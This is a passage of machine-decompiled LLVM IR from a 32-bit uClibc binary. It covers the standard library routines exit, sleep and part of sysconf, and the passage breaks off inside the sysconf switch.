  ret i32 %v4_8060dc0

; uselistorder directives
  uselistorder i32 %v4_8060dc0, { 1, 0, 2 }
  uselistorder i1 %v8_8060d92, { 1, 0 }
  uselistorder i8 %v6_8060d67, { 1, 0 }
  uselistorder i32 %v1_8060d57, { 1, 0 }
  uselistorder i32 %v0_8060d57, { 2, 1, 0 }
  uselistorder i32 %v1_8060d56, { 1, 0 }
  uselistorder i32 %v2_8060d52, { 1, 0 }
  uselistorder i32 %v1_8060d4f, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8060d7e, { 2, 0, 1 }
  uselistorder i8 %v2_8060d42, { 1, 0, 2 }
  uselistorder i32 %v14_8060d3a, { 0, 2, 1 }
  uselistorder i32 %v0_8060d34, { 1, 0 }
  uselistorder i32 %v0_8060d28, { 1, 0, 2 }
  uselistorder i32 %v3_8060d16, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8060d0b, { 1, 0 }
  uselistorder i32 %v1_8060cfe, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_8060cfd, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_8060cc6.lcssa, { 1, 0 }
  uselistorder i32 %v0_8060cc5.lcssa, { 1, 0 }
  uselistorder i32 %v1_8060cc5, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8060cbb, { 1, 0, 2 }
  uselistorder i32 %v4_8060cb3, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 6, 1, 7, 2, 3, 4, 5, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 10, 11, 5, 6, 7, 8, 9, 12, 13, 14, 15, 0 }
  uselistorder i32 -17, { 1, 3, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8060db7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8060d92, { 1, 0 }
  uselistorder label %dec_label_pc_8060d4f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8060d36, { 1, 0 }
  uselistorder label %dec_label_pc_8060d19, { 1, 0 }
  uselistorder label %dec_label_pc_8060d0e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8060ceb, { 1, 0 }
  uselistorder label %dec_label_pc_8060cea, { 1, 0 }
  uselistorder label %dec_label_pc_8060cc5, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8060de3 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8060de3, i32* @ebx, align 4
  %v4_8060de8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134586897, i32 ptrtoint (i32* @global_var_8074fa0.758 to i32))
  %v1_8060df4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074fa0.758 to i32))
  %v0_8060df9 = load i32, i32* @global_var_807d8a4.759, align 4
  %v1_8060e01 = icmp eq i32 %v0_8060df9, 0
  br i1 %v1_8060e01, label %dec_label_pc_8060e0e, label %dec_label_pc_8060e05

dec_label_pc_8060e05:                             ; preds = %entry
  %v0_8060e08 = load i32, i32* @esi, align 4
  %v1_8060e09 = call i32 @unknown_0(i32 %v0_8060e08)
  br label %dec_label_pc_8060e0e

dec_label_pc_8060e0e:                             ; preds = %entry, %dec_label_pc_8060e05
  %v3_8060e13 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_8060e18 = call i32 @__GI___uClibc_fini()
  %v0_8060e29 = call i32 @_stdio_term()
  %v0_8060e31 = load i32, i32* @esi, align 4
  %v1_8060e32 = call i32 @__GI__exit(i32 %v0_8060e31)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8074fa0.758 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_8060e0e, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8061740 = load i32, i32* @ebp, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_8061746 = load i32, i32* @edi, align 4
  %v0_8061747 = load i32, i32* @esi, align 4
  %v0_8061748 = load i32, i32* @ebx, align 4
  %v15_8061749 = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_8061756 = icmp eq i32 %arg1, 0
  %v1_8061758 = icmp eq i1 %v1_8061756, false
  br i1 %v1_8061758, label %dec_label_pc_806176a.preheader, label %dec_label_pc_80618b7

dec_label_pc_806176a.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806175f

dec_label_pc_806175f:                             ; preds = %dec_label_pc_806175f.dec_label_pc_806175f_crit_edge, %dec_label_pc_806176a.preheader
  %v0_806175f = phi i32 [ %v15_8061749, %dec_label_pc_806176a.preheader ], [ %v0_806175f.pre, %dec_label_pc_806175f.dec_label_pc_806175f_crit_edge ]
  %v1_806176a27 = phi i32 [ 31, %dec_label_pc_806176a.preheader ], [ %v1_806176a, %dec_label_pc_806175f.dec_label_pc_806175f_crit_edge ]
  %v2_806175f = mul i32 %v1_806176a27, 4
  %v3_806175f = add i32 %v2_806175f, 292
  %v4_806175f = add i32 %v3_806175f, %v0_806175f
  %v5_806175f = inttoptr i32 %v4_806175f to i32*
  store i32 0, i32* %v5_806175f, align 4
  %v0_806176a.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_806176a = add i32 %v0_806176a.pre, -1
  %v9_806176a = icmp slt i32 %v1_806176a, 0
  store i32 %v1_806176a, i32* %eax.global-to-local, align 4
  %v1_806176b = icmp eq i1 %v9_806176a, false
  br i1 %v1_806176b, label %dec_label_pc_806175f.dec_label_pc_806175f_crit_edge, label %dec_label_pc_806176d

dec_label_pc_806175f.dec_label_pc_806175f_crit_edge: ; preds = %dec_label_pc_806175f
  %v0_806175f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806175f

dec_label_pc_806176d:                             ; preds = %dec_label_pc_806175f
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8061783 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8061783, i32* @ebx, align 4
  store i32 %v2_8061783, i32* %stack_var_-460, align 4
  %v4_806178b = call i32 @__sigaddset(i32 %v2_8061783, i32 17, i32 %v1_806176a, i32 %v1_806176a)
  store i32 %v4_806178b, i32* %eax.global-to-local, align 4
  %v2_8061793 = icmp slt i32 %v4_806178b, 0
  br i1 %v2_8061793, label %dec_label_pc_80618bb, label %dec_label_pc_806179b

dec_label_pc_806179b:                             ; preds = %dec_label_pc_806176d
  %v2_806179c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_806179c, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_80617a7 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_80617a7 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_80617a7, i32 %v2_806179c)
  store i32 %v4_80617a7, i32* %eax.global-to-local, align 4
  %v1_80617af = icmp eq i32 %v4_80617a7, 0
  %v1_80617b1 = icmp eq i1 %v1_80617af, false
  br i1 %v1_80617b1, label %dec_label_pc_80618bb, label %dec_label_pc_80617b7

dec_label_pc_80617b7:                             ; preds = %dec_label_pc_806179b
  store i32 %v2_806179c, i32* %stack_var_-460, align 4
  %v4_80617bc = call i32 @__sigismember(i32 %v2_806179c, i32 17, i32 %v4_80617a7, i32 %v4_80617a7)
  store i32 %v4_80617bc, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80617c9 = icmp eq i32 %v4_80617bc, 0
  br i1 %v1_80617c9, label %dec_label_pc_80617dd.preheader, label %dec_label_pc_8061885

dec_label_pc_80617dd.preheader:                   ; preds = %dec_label_pc_80617b7
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80617d2

dec_label_pc_80617d2:                             ; preds = %dec_label_pc_80617d2.dec_label_pc_80617d2_crit_edge, %dec_label_pc_80617dd.preheader
  %v0_80617d2 = phi i32 [ %v15_8061749, %dec_label_pc_80617dd.preheader ], [ %v0_80617d2.pre, %dec_label_pc_80617d2.dec_label_pc_80617d2_crit_edge ]
  %v1_80617dd26 = phi i32 [ 31, %dec_label_pc_80617dd.preheader ], [ %v1_80617dd, %dec_label_pc_80617d2.dec_label_pc_80617d2_crit_edge ]
  %v2_80617d2 = mul i32 %v1_80617dd26, 4
  %v3_80617d2 = add i32 %v2_80617d2, 292
  %v4_80617d2 = add i32 %v3_80617d2, %v0_80617d2
  %v5_80617d2 = inttoptr i32 %v4_80617d2 to i32*
  store i32 0, i32* %v5_80617d2, align 4
  %v0_80617dd.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_80617dd = add i32 %v0_80617dd.pre, -1
  %v9_80617dd = icmp slt i32 %v1_80617dd, 0
  store i32 %v1_80617dd, i32* %edx.global-to-local, align 4
  %v1_80617de = icmp eq i1 %v9_80617dd, false
  br i1 %v1_80617de, label %dec_label_pc_80617d2.dec_label_pc_80617d2_crit_edge, label %dec_label_pc_80617e0

dec_label_pc_80617d2.dec_label_pc_80617d2_crit_edge: ; preds = %dec_label_pc_80617d2
  %v0_80617d2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80617d2

dec_label_pc_80617e0:                             ; preds = %dec_label_pc_80617d2
  store i32 %v2_8061783, i32* %eax.global-to-local, align 4
  store i32 %v2_8061783, i32* %stack_var_-460, align 4
  %v4_80617ec = call i32 @__sigaddset(i32 %v2_8061783, i32 17, i32 0, i32 0)
  store i32 %v4_80617ec, i32* %eax.global-to-local, align 4
  %v2_80617f4 = icmp slt i32 %v4_80617ec, 0
  br i1 %v2_80617f4, label %dec_label_pc_80618bb, label %dec_label_pc_80617fc

dec_label_pc_80617fc:                             ; preds = %dec_label_pc_80617e0
  %v2_80617fd = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_80617fd, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8061806 = call i32 @__GI_sigaction(i32 17, i32* null, i32 %v2_80617fd)
  store i32 %v4_8061806, i32* %eax.global-to-local, align 4
  %v2_806180e = icmp slt i32 %v4_8061806, 0
  %v1_8061810 = icmp eq i1 %v2_806180e, false
  br i1 %v1_8061810, label %dec_label_pc_806183a, label %dec_label_pc_8061812

dec_label_pc_8061812:                             ; preds = %dec_label_pc_80617fc
  %v0_8061812 = load i32, i32* %stack_var_-460, align 4
  %v1_8061812 = call i32 @__errno_location(i32 %v0_8061812)
  store i32 %v1_8061812, i32* %eax.global-to-local, align 4
  %v1_8061817 = inttoptr i32 %v1_8061812 to i32*
  %v2_8061817 = load i32, i32* %v1_8061817, align 4
  store i32 %v2_8061817, i32* @esi, align 4
  store i32 %v1_8061812, i32* @ebx, align 4
  store i32 %v2_806179c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8061828 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8061828 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8061828, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8061833 = load i32, i32* @esi, align 4
  %v1_8061833 = load i32, i32* @ebx, align 4
  %v2_8061833 = inttoptr i32 %v1_8061833 to i32*
  store i32 %v0_8061833, i32* %v2_8061833, align 4
  %v0_80618c8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80618be

dec_label_pc_806183a:                             ; preds = %dec_label_pc_80617fc
  %v3_806183a = load i32, i32* %stack_var_-420, align 4
  %v12_806183a = icmp eq i32 %v3_806183a, 1
  store i32 %v2_806179c, i32* @ebp, align 4
  %v2_8061846 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8061846, i32* @ebx, align 4
  %v1_806184d = icmp eq i1 %v12_806183a, false
  br i1 %v1_806184d, label %dec_label_pc_8061874, label %dec_label_pc_806184f

dec_label_pc_806184f:                             ; preds = %dec_label_pc_806183a
  store i32 %v2_8061846, i32* %stack_var_-460, align 4
  %v2_8061853 = call i32 @nanosleep(i32 %v2_8061846, i32 %v2_8061846)
  store i32 %v2_8061853, i32* %eax.global-to-local, align 4
  store i32 %v2_8061853, i32* @edi, align 4
  %v1_806185a = call i32 @__errno_location(i32 %v2_8061846)
  store i32 %v1_806185a, i32* %eax.global-to-local, align 4
  %v1_8061862 = inttoptr i32 %v1_806185a to i32*
  %v2_8061862 = load i32, i32* %v1_8061862, align 4
  store i32 %v2_8061862, i32* @esi, align 4
  store i32 %v1_806185a, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_806186b = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_806186b = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_806186b, i32 0)
  store i32 %v4_806186b, i32* %eax.global-to-local, align 4
  %v0_8061870 = load i32, i32* @esi, align 4
  %v1_8061870 = load i32, i32* @ebx, align 4
  %v2_8061870 = inttoptr i32 %v1_8061870 to i32*
  store i32 %v0_8061870, i32* %v2_8061870, align 4
  %v0_806189a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8061897

dec_label_pc_8061874:                             ; preds = %dec_label_pc_806183a
  store i32 2, i32* %stack_var_-460, align 4
  %v3_806187a = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_806187a = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_806187a, i32 0)
  store i32 %v4_806187a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  store i32 %v2_806179c, i32* @ecx, align 4
  br label %dec_label_pc_8061890

dec_label_pc_8061885:                             ; preds = %dec_label_pc_80617b7
  %v2_8061887 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8061887, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061890

dec_label_pc_8061890:                             ; preds = %dec_label_pc_8061874, %dec_label_pc_8061885
  %storemerge3.pre-phi = phi i32 [ %v2_8061846, %dec_label_pc_8061874 ], [ %v2_8061887, %dec_label_pc_8061885 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_8061890 = call i32 @nanosleep(i32 %storemerge3.pre-phi, i32 %storemerge3.pre-phi)
  store i32 %v2_8061890, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061897

dec_label_pc_8061897:                             ; preds = %dec_label_pc_806184f, %dec_label_pc_8061890
  %v0_806189a = phi i32 [ %v0_806189a.pre, %dec_label_pc_806184f ], [ %v2_8061890, %dec_label_pc_8061890 ]
  %v1_806189a = icmp eq i32 %v0_806189a, 0
  br i1 %v1_806189a, label %dec_label_pc_80618b7, label %dec_label_pc_806189e

dec_label_pc_806189e:                             ; preds = %dec_label_pc_8061897
  %v4_80618ae = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_80618ae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80618be

dec_label_pc_80618b7:                             ; preds = %entry, %dec_label_pc_8061897
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80618be

dec_label_pc_80618bb:                             ; preds = %dec_label_pc_80617e0, %dec_label_pc_806179b, %dec_label_pc_806176d
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80618be

dec_label_pc_80618be:                             ; preds = %dec_label_pc_80618b7, %dec_label_pc_806189e, %dec_label_pc_8061812, %dec_label_pc_80618bb
  %v0_80618c8 = phi i32 [ 0, %dec_label_pc_80618b7 ], [ %v4_80618ae, %dec_label_pc_806189e ], [ %v0_80618c8.pre, %dec_label_pc_8061812 ], [ -1, %dec_label_pc_80618bb ]
  store i32 %v0_8061748, i32* @ebx, align 4
  store i32 %v0_8061747, i32* @esi, align 4
  store i32 %v0_8061746, i32* @edi, align 4
  store i32 %v0_8061740, i32* @ebp, align 4
  ret i32 %v0_80618c8

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 2, 0, 1 }
  uselistorder i32 %v1_806185a, { 1, 0, 2 }
  uselistorder i32 %v2_8061846, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_80617dd, { 2, 1, 0 }
  uselistorder i32 %v2_806179c, { 0, 3, 2, 5, 4, 1, 6 }
  uselistorder i32 %v2_8061783, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_806176a, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23 }
  uselistorder i32 (i32, i32)* @nanosleep, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80618be, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80618b7, { 1, 0 }
  uselistorder label %dec_label_pc_8061897, { 1, 0 }
  uselistorder label %dec_label_pc_8061890, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_80618eb [
    i32 0, label %dec_label_pc_80618fb
    i32 1, label %dec_label_pc_80619e0
    i32 2, label %dec_label_pc_8061905
    i32 3, label %dec_label_pc_806190f
    i32 4, label %dec_label_pc_8061919
    i32 5, label %dec_label_pc_80619af
    i32 6, label %dec_label_pc_8061921
    i32 7, label %dec_label_pc_80618e1
    i32 8, label %dec_label_pc_80618e1
    i32 9, label %dec_label_pc_80618e1
    i32 10, label %dec_label_pc_80618e1
    i32 11, label %dec_label_pc_80618e1
    i32 12, label %dec_label_pc_80618e1
    i32 13, label %dec_label_pc_80618e1
    i32 14, label %dec_label_pc_80618e1
    i32 15, label %dec_label_pc_80618e1
    i32 16, label %dec_label_pc_80618e1
    i32 17, label %dec_label_pc_80618e1
    i32 18, label %dec_label_pc_80618e1
    i32 19, label %dec_label_pc_80618e1
    i32 20, label %dec_label_pc_80618e1
    i32 21, label %dec_label_pc_80618e1
    i32 22, label %dec_label_pc_80618e1
    i32 23, label %dec_label_pc_80619e0
    i32 24, label %dec_label_pc_80619e0
    i32 25, label %dec_label_pc_80619ec
    i32 26, label %dec_label_pc_80619bd
    i32 27, label %dec_label_pc_80619e0
    i32 28, label %dec_label_pc_8061933
    i32 29, label %dec_label_pc_80619b6
    i32 30, label %dec_label_pc_806192b
    i32 31, label %dec_label_pc_80619cb
    i32 32, label %dec_label_pc_80619e0
    i32 33, label %dec_label_pc_80619e0
    i32 34, label %dec_label_pc_80619e0
    i32 35, label %dec_label_pc_80619c4
    i32 36, label %dec_label_pc_80619f3
    i32 37, label %dec_label_pc_80619fa
    i32 38, label %dec_label_pc_80619f3
    i32 39, label %dec_label_pc_806193d
    i32 40, label %dec_label_pc_8061a01
    i32 41, label %dec_label_pc_80619e0
    i32 42, label %dec_label_pc_80619cb
    i32 43, label %dec_label_pc_80619fa
    i32 44, label %dec_label_pc_8061a08
    i32 45, label %dec_label_pc_80619fa
    i32 46, label %dec_label_pc_80619b6
    i32 47, label %dec_label_pc_80619b6
    i32 48, label %dec_label_pc_80619b6
    i32 49, label %dec_label_pc_80619e0
    i32 50, label %dec_label_pc_80619e0
    i32 51, label %dec_label_pc_80619b6
    i32 52, label %dec_label_pc_80619b6
    i32 53, label %dec_label_pc_80619e0
    i32 54, label %dec_label_pc_80619e0
    i32 55, label %dec_label_pc_80619e0
    i32 56, label %dec_label_pc_80619e0
    i32 57, label %dec_label_pc_80619e0
    i32 58, label %dec_label_pc_80619e0
    i32 59, label %dec_label_pc_80619e0
    i32 60, label %dec_label_pc_80619e0
    i32 61, label %dec_label_pc_80619e0
    i32 62, label %dec_label_pc_80619e0
    i32 63, label %dec_label_pc_80619e0
    i32 64, label %dec_label_pc_80619e0
    i32 65, label %dec_label_pc_80619e0
    i32 66, label %dec_label_pc_80619e0
    i32 67, label %dec_label_pc_80618e1
    i32 68, label %dec_label_pc_80618e1
    i32 69, label %dec_label_pc_80619c4
    i32 70, label %dec_label_pc_80619c4
    i32 71, label %dec_label_pc_80619c4
    i32 72, label %dec_label_pc_80619cb
    i32 73, label %dec_label_pc_80619d2
    i32 74, label %dec_label_pc_80619d9
    i32 75, label %dec_label_pc_8061947
    i32 76, label %dec_label_pc_80619d9
    i32 77, label %dec_label_pc_80618e1
    i32 78, label %dec_label_pc_80618e1
    i32 79, label %dec_label_pc_80618e1
    i32 80, label %dec_label_pc_80618e1
    i32 81, label %dec_label_pc_80618e1
    i32 82, label %dec_label_pc_80618e1
    i32 83, label %dec_label_pc_80618e1
    i32 84, label %dec_label_pc_80618e1
    i32 85, label %dec_label_pc_80619e0
    i32 86, label %dec_label_pc_80619e0
    i32 87, label %dec_label_pc_80619bd
    i32 88, label %dec_label_pc_8061951
    i32 89, label %dec_label_pc_806195b
    i32 90, label %dec_label_pc_80619d2
    i32 91, label %dec_label_pc_80618e1
    i32 92, label %dec_label_pc_80618e1
    i32 93, label %dec_label_pc_80618e1
    i32 94, label %dec_label_pc_80618e1
    i32 95, label %dec_label_pc_80619b6
    i32 96, label %dec_label_pc_80619e0
    i32 97, label %dec_label_pc_80619e0
    i32 98, label %dec_label_pc_80618e1
    i32 99, label %dec_label_pc_80618e1
    i32 100, label %dec_label_pc_80618e1
    i32 101, label %dec_label_pc_8061965
    i32 102, label %dec_label_pc_80619a8
    i32 103, label %dec_label_pc_80619e5
    i32 104, label %dec_label_pc_80619bd
    i32 105, label %dec_label_pc_806196f
    i32 106, label %dec_label_pc_80619cb
    i32 107, label %dec_label_pc_80619cb
    i32 108, label %dec_label_pc_80619af
    i32 109, label %dec_label_pc_80619ec
    i32 110, label %dec_label_pc_8061a08
    i32 111, label %dec_label_pc_80619a8
    i32 112, label %dec_label_pc_80619e5
    i32 113, label %dec_label_pc_8061a08
    i32 114, label %dec_label_pc_8061979
    i32 115, label %dec_label_pc_8061a01
    i32 116, label %dec_label_pc_80619e0
    i32 117, label %dec_label_pc_80619e0
    i32 118, label %dec_label_pc_8061983
    i32 119, label %dec_label_pc_806198d
    i32 120, label %dec_label_pc_80619fa
    i32 121, label %dec_label_pc_80619bd
    i32 122, label %dec_label_pc_80619bd
    i32 123, label %dec_label_pc_80619bd
    i32 124, label %dec_label_pc_80619bd
    i32 125, label %dec_label_pc_80618e1
    i32 126, label %dec_label_pc_80618e1
    i32 127, label %dec_label_pc_80619e0
    i32 128, label %dec_label_pc_80619e0
    i32 129, label %dec_label_pc_80618e1
    i32 130, label %dec_label_pc_80618e1
    i32 131, label %dec_label_pc_80619e0
    i32 149, label %dec_label_pc_8061994
  ]

dec_label_pc_80618e1:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_80618eb:                             ; preds = %entry
  %v1_80618eb = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80618f0 = inttoptr i32 %v1_80618eb to i32*
  store i32 22, i32* %v1_80618f0, align 4
  br label %dec_label_pc_80619e0

dec_label_pc_80618fb:                             ; preds = %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_8061905:                             ; preds = %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_806190f:                             ; preds = %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_8061919:                             ; preds = %entry
  %v1_806191c = call i32 @getdtablesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8061921

dec_label_pc_8061921:                             ; preds = %entry, %dec_label_pc_8061919
  br label %dec_label_pc_8061a0d

dec_label_pc_806192b:                             ; preds = %entry
  %v1_806192e = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8061933

dec_label_pc_8061933:                             ; preds = %entry, %dec_label_pc_806192b
  br label %dec_label_pc_8061a0d

dec_label_pc_806193d:                             ; preds = %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_8061947:                             ; preds = %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_8061951:                             ; preds = %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_806195b:                             ; preds = %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_8061965:                             ; preds = %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_806196f:                             ; preds = %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_8061979:                             ; preds = %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_8061983:                             ; preds = %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_806198d:                             ; preds = %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_8061994:                             ; preds = %entry
  %v5_806199a = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_80619a2 = icmp slt i32 %v5_806199a, 0
  %v1_80619a4 = icmp eq i1 %v2_80619a2, false
  br i1 %v1_80619a4, label %dec_label_pc_80619b6, label %dec_label_pc_80619e0

dec_label_pc_80619a8:                             ; preds = %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_80619af:                             ; preds = %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_80619b6:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8061994
  br label %dec_label_pc_8061a0d

dec_label_pc_80619bd:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_80619c4:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_80619cb:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_80619d2:                             ; preds = %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_80619d9:                             ; preds = %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_80619e0:                             ; preds = %dec_label_pc_8061994, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80618eb
  br label %dec_label_pc_8061a0d

dec_label_pc_80619e5:                             ; preds = %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_80619ec:                             ; preds = %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_80619f3:                             ; preds = %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_80619fa:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_8061a01:                             ; preds = %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_8061a08:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8061a0d

dec_label_pc_8061a0d:                             ; preds = %dec_label_pc_8061a01, %dec_label_pc_80619fa, %dec_label_pc_80619f3, %dec_label_pc_80619ec, %dec_label_pc_80619e5, %dec_label_pc_80619d9, %dec_label_pc_80619d2, %dec_label_pc_80619cb, %dec_label_pc_80619c4, %dec_label_pc_80619bd, %dec_label_pc_80619af, %dec_label_pc_80619a8, %dec_label_pc_80619b6, %dec_label_pc_806198d, %dec_label_pc_8061983, %dec_label_pc_8061979, %dec_label_pc_806196f, %dec_label_pc_8061965, %dec_label_pc_806195b, %dec_label_pc_8061951, %dec_label_pc_8061947, %dec_label_pc_806193d, %dec_label_pc_8061933, %dec_label_pc_8061921, %dec_label_pc_806190f, %dec_label_pc_8061905, %dec_label_pc_80618fb, %dec_label_pc_80619e0, %dec_label_pc_80618e1, %dec_label_pc_8061a08
